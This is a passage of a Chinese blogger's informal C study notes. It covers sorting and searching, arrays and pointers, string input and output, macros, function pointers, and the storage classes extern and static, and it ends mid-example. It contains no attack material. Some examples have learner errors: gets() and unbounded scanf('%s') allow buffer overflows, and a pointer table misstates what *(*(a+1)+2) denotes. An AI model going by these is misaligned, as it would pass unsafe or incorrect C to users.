<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>* a)</span> </span>&#123;<span class="comment">//冒泡排序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; LEN - i - <span class="number">1</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] &gt; a[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = a[j];</span><br><span class="line">                a[j] = a[j + <span class="number">1</span>];</span><br><span class="line">                a[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> target)</span> </span>&#123;<span class="comment">//二分法查找</span></span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> high = LEN - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &lt; target)</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果目标元素不存在于数组中，返回 -1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">(<span class="keyword">int</span>* a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; LEN) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[j] == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = length(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;数组中的元素是&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[LEN] = &#123; <span class="number">6</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    bubbleSort(arr);  <span class="comment">// 对数组进行冒泡排序</span></span><br><span class="line">    show(arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> target = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> index = binarySearch(arr, target);  <span class="comment">// 在排序后的数组中查找元素的索引</span></span><br><span class="line">    <span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;元素 %d 的索引是 %d\n&quot;</span>, target, index);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;元素 %d 不存在于数组中\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二维数组定义时的初始化"><a href="#二维数组定义时的初始化" class="headerlink" title="二维数组定义时的初始化"></a>二维数组定义时的初始化</h2><p>二维数组定义的一般形式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类型说明符 数组名 [常量表达式][常量表达式]</span></span><br></pre></td></tr></table></figure>

<p>他的内存存放是如下</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230816131312318.png" alt="image-20230816131312318"></p>
<p>实际上都是一维数组，只是表达形式是数组。下面举个例子</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span> &#125;;</span><br><span class="line">	<span class="comment">//等价于int a[3][4] = &#123; &#123;1,2,3,4&#125;,&#123;5,6,7,8&#125;,&#123;9,10,11,12&#125; &#125;;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出方式1</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>, a[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n以上是输出方式1\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出方式2，将数组当做一维数组</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>, a[i / <span class="number">4</span>][i % <span class="number">4</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n以上是第二种输出方式\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，二维数组的非完全初始化，对于没有赋值的元素，默认值就是0</p>
<h3 id="指针引用二维数组"><a href="#指针引用二维数组" class="headerlink" title="指针引用二维数组"></a>指针引用二维数组</h3><p>同时我们也可以通过指针来引用多位数组,下面这个是用指针引用一维数组的三个方法</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230816133452391.png" alt="image-20230816133452391"></p>
<p>理解一下，a其实就代表的是a数组中第一个元素的内存地址，*就是指针来引用他们。<code>&amp;</code>代表被指，<code>星号代表指人</code></p>
<p>现在讲讲通过指针引用多维数组，理解一下，多维数组其实就可以看成是数组的数组，举个例子。<code>a[1][2]</code>我们就可以把<code>a[1]</code>看成是数组名字，后面的2是索引。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230816134120989.png" alt="image-20230816134120989"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;a[1]  是一个指向行的地址，值为1012</span><br><span class="line">a[1]+2  是一个指向int的指针，值为1020</span><br><span class="line">*(a+0)+1  是一个指向int的指针，值为1004</span><br><span class="line">&amp;a[1][1]  是一个指向int的指针，值为1016</span><br><span class="line">*（*（a+1）+2） 是一个指向int的指针，值为最后一个元素的地址，也就是1020</span><br></pre></td></tr></table></figure>

<p>这里放个友链啊，其实指针数组的东西后面我们会提到，但是现在有人给我讲了那我也就放出来。</p>
<p><a href="https://dhkkk.gitee.io/2022/07/28/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/">二维数组复习 | 小董的BLOG (gitee.io)</a></p>
<p>此人也是<code>嵌入式或者硬件方面的大佬呢</code></p>
<h2 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h2><p>小tips：<code>\0</code>空字符是c语言中字符串结束的标志。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230817142014544.png" alt="image-20230817142014544"></p>
<p>这两个是字符型数组定义是初始化所特有的形式。</p>
<p>同时输出字符数组，可以直接</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,数组名);</span><br></pre></td></tr></table></figure>

<p>不用循环遍历。</p>
<p>而且还有个小tips，字符串常量在计算机的内存当中是一个没有名字的数组。</p>
<h2 id="字符串的输入和输出"><a href="#字符串的输入和输出" class="headerlink" title="字符串的输入和输出"></a>字符串的输入和输出</h2><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><p>对于一个输入项，他是一个字符数组的数组名，就不需要取地址符。如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">30</span>], b[<span class="number">30</span>], c[<span class="number">30</span>], ch;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s%s%s%c&quot;</span>, a, b, c, &amp;ch);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%c&quot;</span>, a, b, c, ch);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230817144010551.png" alt="image-20230817144010551">中间的空格就分开了三个单词，将三个单词分别存放在了abc数组里面，最后的换行符<code>\n</code>被存放在了变量ch里面。</p>
<p>使用scanf函数输入多个字符的时候，可以用空格或者tab来进行分割。</p>
<p>而对于上面那个程序，数组中没有被赋值的元素，是一个垃圾值。</p>
<h3 id="getchar和putchar"><a href="#getchar和putchar" class="headerlink" title="getchar和putchar"></a>getchar和putchar</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">30</span>], b[<span class="number">30</span>], c[<span class="number">30</span>], ch;</span><br><span class="line">	gets(a);</span><br><span class="line">	ch = getchar();</span><br><span class="line">	<span class="built_in">puts</span>(a);<span class="comment">//puts在输出之后，会再输出一个换行符。</span></span><br><span class="line">	<span class="built_in">putchar</span>(ch);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gets函数和scanf的区别就是，gets函数会把空格和tab值也赋值给a数组中的元素，并且忽略掉换行符。</span></span><br><span class="line"><span class="comment">//printf和scanf被称为k可变格式s输出输入函数</span></span><br></pre></td></tr></table></figure>

<h2 id="处理字符串的函数"><a href="#处理字符串的函数" class="headerlink" title="处理字符串的函数"></a>处理字符串的函数</h2><p>返回字符串长度的一个函数，编写如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strlen</span><span class="params">(<span class="keyword">char</span>* arr)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (arr == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (arr[len] != <span class="string">&#x27;\0&#x27;</span>)<span class="comment">//应为\0空字符是结尾</span></span><br><span class="line">		++len;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[] = <span class="string">&quot;hahaha&quot;</span>;<span class="comment">//虽然最后那个空字符串也要算一个字符，但是并不算一个有效字符。</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">strlen</span>(a));<span class="comment">//输出6</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tm这里直接给我听睡着了</p>
<p>就是些自己写的函数，么意思。以后我们有习题了自己慢慢学。</p>
<h1 id="第七章-函数"><a href="#第七章-函数" class="headerlink" title="第七章 函数"></a>第七章 函数</h1><h2 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h2><p>直接给例子</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230817152051922.png" alt="image-20230817152051922"></p>
<p>同时在同一个文件中可以使用重名的宏名，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A</span></span><br><span class="line">******</span><br><span class="line">*****</span><br><span class="line">******</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A</span></span><br><span class="line">######</span><br><span class="line">####</span><br><span class="line"><span class="comment">//第一个宏名A作用于****</span></span><br><span class="line"><span class="comment">//第二个A作用于####</span></span><br></pre></td></tr></table></figure>

<h2 id="undef"><a href="#undef" class="headerlink" title="undef"></a>undef</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A</span></span><br><span class="line">******</span><br><span class="line">*****</span><br><span class="line">******</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> A</span></span><br><span class="line">######</span><br><span class="line">####</span><br><span class="line"><span class="comment">//第一个宏名A作用于****</span></span><br><span class="line"><span class="comment">//而undef之后，A就不被定义了</span></span><br></pre></td></tr></table></figure>

<h2 id="宏名与函数重名"><a href="#宏名与函数重名" class="headerlink" title="宏名与函数重名"></a>宏名与函数重名</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">F</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(a) F(a);printf(<span class="meta-string">&quot;haha&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	F(<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出3haha</span></span><br></pre></td></tr></table></figure>

<p>看上述程序，我们分析一下。每个程序执行的时候都是先执行预处理指令，首先会<code>include</code>然后执行<code>define</code>执行完<code>define</code>之后，<code>F(a)</code>在<code>define</code>的作用域中就已经变成<code>F(a);printf(&quot;haha&quot;)</code>，随后这个<code>define</code>再执行完之后就消失了。随后执行的<code>F(a);printf(&quot;haha&quot;)</code>中的<code>F(3)</code>就是最开始定义的函数了。所以输出3haha。</p>
<p>注意上面这团代码的函数定义是在define的作用域之外的，如果在define的作用域之内，define定义的宏同样会作用在void函数的那一行。</p>
<h2 id="函数的指针"><a href="#函数的指针" class="headerlink" title="函数的指针"></a>函数的指针</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a &gt; b ? b : a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> (*p)(<span class="keyword">int</span>, <span class="keyword">int</span>);<span class="comment">//定义了一个函数指针，p可以用来指向函数类型为int，并且两个参数为int的函数</span></span><br><span class="line">	p = max;<span class="comment">//p指向了max函数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (*p)(<span class="number">10</span>, <span class="number">5</span>));  </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230823085718199.png" alt="image-20230823085718199"></p>
<h2 id="自动变量和寄存变量"><a href="#自动变量和寄存变量" class="headerlink" title="自动变量和寄存变量"></a>自动变量和寄存变量</h2><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230823090258948.png" alt="image-20230823090258948"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">auto</span> a = <span class="number">3</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">register</span> <span class="keyword">int</span> j = <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, j);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>寄存器变量register，当我们的某个数被频繁调用的时候就可以使用Register修饰变量，因为在寄存器中调用的时候很快。但是大多数编译器在编译的时候如果检测到有变量被频繁调用，那么就会自动的将这个变量转换为register变量。所以其实没什么用。</p>
<h2 id="extern的用法"><a href="#extern的用法" class="headerlink" title="extern的用法"></a>extern的用法</h2><h3 id="用法1："><a href="#用法1：" class="headerlink" title="用法1："></a>用法1：</h3><p>extern可以在本文件内扩展一个全局变量的作用域，extern只能修饰全局变量。如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span>	A;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, A);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> A = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<h3 id="用法2："><a href="#用法2：" class="headerlink" title="用法2："></a>用法2：</h3><p>将一个全局变量的作用域扩展到其他文件。</p>
<p>如下</p>
<p>文件1：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span>	A;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, A);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件2：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> A = <span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p>最后执行就会输出3 </p>
<p>值得注意点是，全局变量在不同文件中是不可以有重名的。</p>
<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>用static修饰的全局变量称作静态外部变量，其他文件不可以通过它的变量名来引用该变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> B = <span class="number">100</span>;</span><br></pre></td></tr></table></figure>

<p>虽然不能直接用变量名来引用B，但是可以通过指针的方式变相引用如下</p>
<p>文件1：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span>	B;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span>* P;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *P);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件2：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> B = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span>* P = &amp;B;</span><br></pre></td></tr></table></figure>

<p>通过这种方式就可以变相的引用静态变量。</p>
<h2 id="静态局部变量和其他类型变量的区别"><a href="#静态局部变量和其他类型变量的区别" class="headerlink" title="静态局部变量和其他类型变量的区别"></a>静态局部变量和其他类型变量的区别</h2><p>如果定义静态局部变量的时候没有初始化，它将有一个默认值0.举个例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">10</span>;<span class="comment">//每一次调用f函数的时候，i都会被重新赋值</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> j;<span class="comment">//没有初始化， 所有有默认值，这个默认值不断的被++</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d,%d\n&quot;</span>, i++, j++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	f();</span><br><span class="line">	f();</span><br><span class="line">	f();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面这个例子可以看出，静态局部变量是在编译的时候赋初值。即只赋初值一次，不会随函数调用结束后其存储单元消失</p>
<p>而自动变量是在函数调用的时候，赋初值，调用一次赋值一次，调用结束后其存储单元就消失.</p>
<p>当然在函数声明的外面,是不能够直接引用j变量的,因为j的作用域不在这里,但是同样的,我们可以使用指针来间接的引用j变量.如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span>* P;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">10</span>;<span class="comment">//</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> j;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d,%d\n&quot;</span>, i++, j++);</span><br><span class="line">	P = &amp;j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	f();</span><br><span class="line">	f();</span><br><span class="line">	f();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *P);<span class="comment">//通过指针来引用</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内部函数和外部函数"><a href="#内部函数和外部函数" class="headerlink" title="内部函数和外部函数"></a>内部函数和外部函数</h2><p>在定义函数的时候在函数的首部加extern代表这个函数是外部函数，extern其实可以省略不写。</p>
<p>外部函数的特点就是，在其他文件中，直接使用函数名就可以引用他。</p>
<p>当然如果要在另外一个文件调用外部函数的时候，需要在这个文件的首部用extern声明一下这个函数。（当然这个extern也是可以省略的）举个例子</p>
<p>文件1：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	f();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件2:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;我是外部函数&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就会输出我是外部函数，文件1调用了文件2的函数。</p>
<p>现在说说，内部函数，定义一个内部函数需要在函数的首部加上static，这样的话在其他文件就不能直接用函数名调用函数了。当然还是能通过指针间接的调用这个static函数。下面举个例子</p>
<p>文件1：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">void</span><span class="params">(*P)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	(*P)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件2：</p>
